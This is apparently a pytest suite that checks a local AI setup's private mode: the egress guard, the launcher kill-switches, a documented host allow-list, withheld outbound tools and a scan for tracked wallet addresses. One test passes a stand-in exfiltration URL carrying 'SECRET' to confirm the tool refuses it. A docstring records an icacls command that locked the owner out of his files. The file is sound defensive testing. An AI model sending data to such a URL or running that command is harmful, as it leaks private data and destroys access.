"""PRIVATE MODE stays true. The owner's requirement, in his words: the local
AI must never give my data to an external party.

These tests fail when a new external host appears in the code outside the
documented list, when a launcher stops setting a kill-switch, when a tool
that leaves the machine is offered silently, or when the guard itself lets
a connection through. The audit that produced them (2026-09-11) is
summarised in docs/PRIVACY.md.
"""

import io
import os
import re
import socket
import subprocess
import sys

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

import lpai_private as lp  # noqa: E402


def _tracked(patterns):
    out = subprocess.run(["git", "ls-files"] + list(patterns), cwd=ROOT, capture_output=True, text=True).stdout.split()
    return [f for f in out if not f.startswith(("experiments/", "tests/"))]


def _read(rel):
    return io.open(os.path.join(ROOT, rel), encoding="utf-8", errors="replace").read()


# --------------------------------------------------------------------------- #
# The guard itself
# --------------------------------------------------------------------------- #

class TestTheEgressGuard:
    def test_private_is_the_default(self, monkeypatch):
        monkeypatch.delenv("LPAI_PRIVATE", raising=False)
        assert lp.is_private()
        monkeypatch.setenv("LPAI_PRIVATE", "0")
        assert not lp.is_private()

    def test_a_hostname_is_refused_at_name_resolution(self):
        with pytest.raises(lp.EgressBlocked):
            socket.getaddrinfo("api.github.com", 443)

    def test_a_literal_public_ip_is_refused_at_connect(self):
        with pytest.raises(lp.EgressBlocked):
            socket.create_connection(("1.1.1.1", 443), timeout=3)

    def test_asyncio_on_windows_is_covered(self):
        import asyncio
        with pytest.raises(lp.EgressBlocked):
            asyncio.run(asyncio.open_connection("1.1.1.1", 443))

    def test_loopback_and_socketpair_keep_working(self):
        a, b = socket.socketpair(); a.close(); b.close()
        srv = socket.socket(); srv.bind(("127.0.0.1", 0)); srv.listen(1)
        c = socket.create_connection(srv.getsockname(), timeout=2); c.close(); srv.close()
        assert socket.getaddrinfo("localhost", 80)

    def test_the_allow_list_is_honoured(self, monkeypatch):
        monkeypatch.setenv("LPAI_ALLOW_HOSTS", "192.168.99.7,host.docker.internal")
        assert lp._is_local_host("192.168.99.7") and lp._is_local_host("HOST.DOCKER.INTERNAL")
        assert not lp._is_local_host("192.168.99.8")

    def test_every_kill_switch_is_assigned_not_defaulted(self, monkeypatch):
        for k in lp.PRIVATE_ENV:
            monkeypatch.setenv(k, "WRONG")
        lp.apply_env()
        for k, v in lp.PRIVATE_ENV.items():
            assert os.environ[k] == v, k

    def test_the_libraries_read_the_switches(self):
        import huggingface_hub.constants as c
        assert c.HF_HUB_OFFLINE and c.HF_HUB_DISABLE_TELEMETRY
        import streamlit.config as sc
        sc.get_config_options(force_reparse=True)
        assert sc.get_option("browser.gatherUsageStats") is False
        try:
            import gradio.analytics as ga
            assert not ga.analytics_enabled()
        except ImportError:
            pass

    def test_a_remote_model_endpoint_is_refused(self, monkeypatch):
        monkeypatch.delenv("LPAI_ALLOW_REMOTE_LLM", raising=False)
        with pytest.raises(ValueError):
            lp.require_local_endpoint("http://example.invalid/v1")
        assert lp.require_local_endpoint("http://127.0.0.1:8080/v1")
        monkeypatch.setenv("LPAI_ALLOW_REMOTE_LLM", "1")
        assert lp.require_local_endpoint("http://example.invalid/v1")

    def test_the_updater_is_off_in_private_mode(self, monkeypatch, capsys):
        import urllib.request
        monkeypatch.setattr(urllib.request, "urlopen", lambda *a, **k: (_ for _ in ()).throw(AssertionError("network")))
        from local_ai.__main__ import main
        assert main([]) == 0
        assert "update check off" in capsys.readouterr().out


# --------------------------------------------------------------------------- #
# The code: no new host without a name, a purpose and a switch
# --------------------------------------------------------------------------- #

# Every external host the tracked code names, with what reaches it and what
# turns it off. A host not in this table fails the test below: add it HERE
# with its purpose, never silently.
ALLOWED_HOSTS = {
    # market data (egress class c: watchlists + API-key identity; private mode blocks the socket)
    "api.coingecko.com": "crypto prices; blocked in private mode",
    "api.dexscreener.com": "PulseChain token prices; blocked in private mode",
    "api.scan.pulsechain.com": "chain explorer; blocked in private mode",
    "scan.pulsechain.com": "chain explorer; blocked in private mode",
    "graph.pulsechain.com": "PulseX GraphQL; blocked in private mode",
    "rpc.pulsechain.com": "chain RPC (carries the address); blocked in private mode",
    "eth.llamarpc.com": "Ethereum RPC; blocked in private mode",
    "etherscan.io": "explorer link in text only",
    "deep-index.moralis.io": "wallet history with MORALIS_API_KEY; blocked in private mode",
    # research (egress class a: the owner's words in the URL; tools withheld in private mode)
    "api.github.com": "research + the update check; withheld / LOCAL_AI_UPDATE_CHECK=0 in private mode",
    "github.com": "links, gh pr create (create_pr withheld in private mode)",
    "export.arxiv.org": "research; withheld in private mode",
    "hn.algolia.com": "research; withheld in private mode",
    "news.ycombinator.com": "research; withheld in private mode",
    "reddit.com": "research; withheld in private mode",
    "www.google.com": "research demo link text",
    "x.com": "link text only (x_* tools are stubs)",
    "hacash.org": "research focus link text",
    "cryptodust.xyz": "docstring example only",
    # messaging (default off: blank TELEGRAM_BOT_TOKEN; blocked in private mode)
    "api.telegram.org": "briefings, manual only; blocked in private mode",
    "t.me": "link text",
    # downloads (inbound only)
    "huggingface.co": "model/voice downloads; HF_HUB_OFFLINE=1 in private mode",
    "astral.sh": "uv installer in the WSL sandbox setup script (owner runs it once)",
    "nodejs.org": "node download in the WSL sandbox setup script (owner runs it once)",
    # generated website assets, not requests this stack makes
    "cdn.tailwindcss.com": "text in generated HTML",
    "fonts.googleapis.com": "text in generated HTML",
    "schema.org": "text in generated HTML",
    "yourdomain.com": "placeholder in generated HTML",
    # local by construction
    "host.docker.internal": "the host, from inside a container",
    # the firewall script's own -Verify probe: curl must FAIL to reach it
    "example.org": "private-firewall.ps1 -Verify probe; success there is the failure",
}
_HOST = re.compile(r"https?://([A-Za-z0-9.\-]+\.[A-Za-z]{2,})(?::\d+)?")


def _hosts_in_code():
    found = {}
    for f in _tracked(["*.py", "*.bat", "*.ps1", "*.sh", "*.yml", "*.yaml", "*.toml"]):
        for m in _HOST.finditer(_read(f)):
            found.setdefault(m.group(1).lower(), set()).add(f)
    return found


class TestNoUndocumentedHost:
    def test_every_host_in_the_code_is_documented(self):
        found = _hosts_in_code()
        unknown = {h: sorted(fs) for h, fs in found.items() if h not in ALLOWED_HOSTS and h != "localhost"}
        assert unknown == {}, f"new external host(s) in the code - document them in ALLOWED_HOSTS with a purpose: {unknown}"

    def test_the_table_carries_no_stale_entries(self):
        found = _hosts_in_code()
        stale = [h for h in ALLOWED_HOSTS if h not in found]
        assert stale == [], f"remove from ALLOWED_HOSTS, nothing references them: {stale}"

    def test_arxiv_is_never_fetched_over_plain_http(self):
        src = _read("openhands_skills/research_agent.py")
        assert "http://export.arxiv" not in src, "the owner's query went to arXiv in plaintext"


# --------------------------------------------------------------------------- #
# The launchers
# --------------------------------------------------------------------------- #

class TestTheLaunchersArePrivate:
    LAUNCHERS = ["start-ai.bat", "start-canvas.bat", "start-canvas-sandboxed.bat", "start-voice.bat"]

    @pytest.mark.parametrize("bat", LAUNCHERS)
    def test_every_launcher_calls_private_env(self, bat):
        assert 'call "%PROJECT%\\scripts\\private-env.bat"' in _read(bat), bat

    def test_private_env_sets_every_switch_and_the_token(self):
        src = _read("scripts/private-env.bat")
        for k, v in lp.PRIVATE_ENV.items():
            assert f'set "{k}={v}"' in src, k
        assert "MCP_TOKEN" in src and "mcp-token.txt" in src

    def test_start_llama_sh_sets_the_same_switches(self):
        src = _read("start-llama.sh")
        for k in lp.PRIVATE_ENV:
            assert k in src, k

    def test_the_docker_path_masks_env_and_keys_the_model(self):
        src = _read("start-ai.bat")
        assert "-ApiKey" in src and "LLAMA_API_KEY" in src
        assert src.count('-v "%PROJECT%\\.env.example":/workspace/.env:ro') >= 3
        # --env-file .env only on the explicit LPAI_PRIVATE=0 branch
        for line in src.splitlines():
            if "--env-file .env" in line:
                assert "LPAI_PRIVATE=0" in line, "the real .env reached a container in private mode"

    def test_no_launcher_binds_the_model_wide_open_without_a_key(self):
        for bat in self.LAUNCHERS + ["start-canvas.bat"]:
            for line in _read(bat).splitlines():
                if line.strip().startswith("::") or line.strip().upper().startswith("REM"):
                    continue
                if "-BindHost 0.0.0.0" in line:
                    assert "-ApiKey" in line, f"{bat}: {line.strip()[:80]}"

    def test_streamlit_usage_stats_are_off_in_the_repo(self):
        assert "gatherUsageStats = false" in _read(".streamlit/config.toml")

    def test_the_canvas_config_helper_adds_the_bearer_header(self, tmp_path, monkeypatch):
        monkeypatch.setenv("USERPROFILE", str(tmp_path)); monkeypatch.setenv("HOME", str(tmp_path))
        monkeypatch.setenv("MCP_TOKEN", "tok123")
        import importlib, scripts.canvas_mcp_config as m
        importlib.reload(m)
        assert m.main(["--port", "8765"]) == 0
        import json
        d = json.loads((tmp_path / ".openhands" / "plugins" / "local-tools" / ".mcp.json").read_text())
        assert d["mcpServers"]["local-tools"]["headers"]["Authorization"] == "Bearer tok123"

    def test_the_files_script_never_strips_inheritance_recursively(self):
        """MEASURED 2026-09-12: `icacls <dir> /inheritance:r /grant:r me:(OI)(CI)F /t`
        left 5,236 files with an EMPTY ACL (folder flags are not applied to
        files), locking the owner out of his own repo, token and Canvas key.
        The explicit ACL goes on the top item only; children are reset to
        inherit from it."""
        src = _read("scripts/private-files.ps1")
        for line in src.splitlines():
            if "/inheritance:r" in line and not line.strip().startswith("#"):
                assert "/t" not in line.split("/inheritance:r")[1], line.strip()
        assert '/reset /t /c /q' in src and '"$t\*"' in src, "children must be reset to inherit"
        assert "OpenRead" in src, "the script must prove the owner can still read"

    def test_the_firewall_script_finds_the_real_interpreter(self):
        src = _read("scripts/private-firewall.ps1")
        assert "pyvenv.cfg" in src and ".Target" in src and "-Undo" in src and "-Verify" in src
        raw = io.open(os.path.join(ROOT, "scripts/private-firewall.ps1"), "rb").read()
        assert raw.startswith(b"\xef\xbb\xbf") and all(b < 128 for b in raw[3:]), "PowerShell 5.1 needs ASCII + BOM"


# --------------------------------------------------------------------------- #
# The tools
# --------------------------------------------------------------------------- #

class TestEgressToolsAreNeverSilent:
    def test_the_voice_registry_marks_every_shared_egress_tool(self):
        from voice_agent import tools as T
        from voice_agent.guard import Risk
        offered = lp.EGRESS_TOOLS - T.VOICE_HIDDEN
        assert offered <= T.VOICE_EGRESS, f"offered by voice but not marked EGRESS: {offered - T.VOICE_EGRESS}"
        assert all(n in lp.EGRESS_TOOLS or n in T.VOICE_HIDDEN for n in T.VOICE_EGRESS)

    def test_the_server_withholds_and_refuses_in_private_mode(self):
        import asyncio
        import openhands_mcp.server as s
        names = {t.name for t in asyncio.run(s.mcp.list_tools())}
        assert not (names & lp.EGRESS_TOOLS), names & lp.EGRESS_TOOLS
        out = s.web_research(url="https://example.invalid/collect?d=SECRET", query="x", user_confirmed=True)
        assert out.get("private_mode") is True and "SECRET" not in str(out.get("error"))
        assert s.research("canary-9f3a").get("private_mode") is True
        assert s.analyze_wallet("0x" + "1" * 40, chain="pulsechain").get("private_mode") is True

    def test_the_server_requires_a_bearer_token(self):
        import openhands_mcp.server as s
        assert s._MCP_TOKEN, "private mode must mint a token"
        assert s._mcp_auth is not None

    def test_every_mcp_tool_name_in_the_egress_list_exists(self):
        src = _read("openhands_mcp/server.py")
        defined = set(re.findall(r"^def (\w+)\(", src, re.M))
        missing = lp.EGRESS_TOOLS - defined
        assert missing == set(), f"EGRESS_TOOLS names no longer defined: {missing}"


# --------------------------------------------------------------------------- #
# The repository that goes public
# --------------------------------------------------------------------------- #

class TestNothingPersonalIsTracked:
    WALLET = re.compile(r"\b0x[0-9a-fA-F]{40}\b")
    # public constants: tokens, routers, an exchange hot wallet, the burn
    # address and obvious placeholders. Anything else is somebody's wallet.
    PUBLIC = {a.lower() for a in [
        "0x000000000000000000000000000000000000dEaD",
        "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",   # USDC (Polygon)
        "0x7a250d5630b4cf539739df2c5dacb4c659f2488d",   # Uniswap V2 router
        "0x95b303987a60c71504d99aa1b13b4da07b0790ab",   # PLSX
        "0x95b303987a60c132dedb7d58c442c4a9a9f4e4f0",   # PLSX variant in the expert
        "0x2b591e99afe9f32eaa6214f7b7629768c40eeb39",   # HEX
        "0xa1077a294dde1b09bb078844df40758a5d0f9a27",   # WPLS
        "0x28c6c06298d514db089934071355e5743bf21d60",   # Binance hot wallet
        "0x3f5ce5fbfe3e9af3971dd833d26ba9b5c936f0be",   # Binance
        "0x57fde0a71132198bbec939b98976993d8d89d225",   # HEX (PulseChain)
        "0x4f9a0e7fd2bf6067db6994cf12e4495df938e6e9",   # INC
        "0x98bf93ebf5c380C0e6Ae8e192A7e2AE08edAcc02",   # PulseX router
        "0x1234567890abcdef1234567890abcdef12345678", "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd",
        "0xaaaabbbbccccddddeeeeffff0000111122223333",
    ]}

    def test_no_wallet_address_in_tracked_files(self):
        hits = {}
        for f in _tracked(["*"]):
            if f.endswith((".png", ".jpg", ".gguf", ".onnx", ".zip")):
                continue
            try:
                text = _read(f)
            except Exception:
                continue
            for m in self.WALLET.finditer(text):
                a = m.group(0)
                if a.lower() in self.PUBLIC or len(set(a[2:].lower())) <= 2:
                    continue
                hits.setdefault(f, set()).add(a)
        assert hits == {}, f"a real-looking wallet address is tracked: {hits}"

    def test_user_data_under_memory_is_not_tracked(self):
        tracked = [f for f in subprocess.run(["git", "ls-files", "memory"], cwd=ROOT, capture_output=True, text=True).stdout.split()]
        allowed = {"memory/example_live_broad_candidates.json", "memory/last_broad_research_example.json"}
        bad = [f for f in tracked if f not in allowed]
        assert bad == [], f"user data tracked in the public repo: {bad}"

    def test_notes_and_log_are_ignored(self):
        gi = _read(".gitignore")
        assert "memory/voice_notes.md" in gi and ("*.jsonl" in gi or "memory/voice_log.jsonl" in gi)
